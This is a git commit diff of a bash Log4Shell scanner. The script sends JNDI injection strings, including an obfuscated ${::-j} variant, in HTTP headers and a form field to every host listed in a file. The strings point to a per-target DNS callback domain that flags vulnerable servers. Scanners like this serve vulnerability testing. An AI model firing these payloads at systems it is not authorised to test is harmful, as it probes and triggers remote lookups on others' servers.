c38a41628de3ad19d832002db2f2cb37bed9d70b
gassara-kys <ogasawara_kiyoshi@cybernagent>
2021-12-15 11:41:32 +0900

    support: url

--- log4shell-scan.sh
+++ log4shell-scan.sh
@@ -1,27 +1,30 @@
 #!/bin/bash
 
+function scan () {
+  # debug(X-Api-Version Header)
+  echo "$1 $2"
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash
+
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$2/a}'|g"          | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$2/a}'|g"    | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$2/a}}'|g"                  | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$2/a}'|g"             | sed "s|\$1|$1|g" | bash
+}
+
 while read fqdn
 do
   echo "$fqdn"
-  DNS_QUERY=log4shell.`echo "$fqdn" | sed -e "s|:.*$||g"`.$DOMAIN
+  DNS_QUERY=log4shell.`echo "$fqdn" | sed -e "s|^https://||g" | sed -e "s|^http://||g" | sed -e "s|:.*$||g" | sed -e "s|/.*$||g"`.$DOMAIN
 
-  # debug(X-Api-Version Header)
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
-
-  # http
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"             | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${jndi:ldap://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"       | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${jndi:ldap://$DNS_QUERY/a}}'|g"                        | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s --max-time 3 http://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
-
-  # https
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"             | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${jndi:ldap://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"       | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${jndi:ldap://$DNS_QUERY/a}}'|g"                        | sed "s|\$fqdn|$fqdn|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 https://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
+  # call scan
+  if [[ $fqdn == "http"* ]]
+  then
+    scan $fqdn $DNS_QUERY
+  else 
+    scan http://$fqdn $DNS_QUERY
+    scan https://$fqdn $DNS_QUERY
+  fi
 done < fqdn.txt
